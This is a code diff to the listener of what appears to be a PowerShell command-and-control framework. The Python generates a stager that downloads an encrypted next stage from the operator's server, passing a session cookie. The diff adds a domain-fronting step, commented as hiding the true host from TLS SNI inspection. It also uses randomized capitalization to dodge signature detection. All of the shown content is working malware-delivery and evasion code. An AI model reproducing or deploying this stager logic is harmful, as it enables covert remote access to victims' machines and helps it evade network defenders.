@@ -272,11 +272,16 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
+                stager += "$ser='%s';$t='%s';" % (host, stage0)
                 #Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
                         headerKey = header.split(':')[0]
                         headerValue = header.split(':')[1]
+			#If host header defined, assume domain fronting is in use and add a call to the base URL first
+			#this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+			if headerKey.lower() == "host":
+			    stager += helpers.randomize_capitalization("try{$ig=$WC.DownloadData($ser)}catch{};")
                         stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                         stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
 
@@ -285,7 +290,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                 stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
 
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+
                 stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
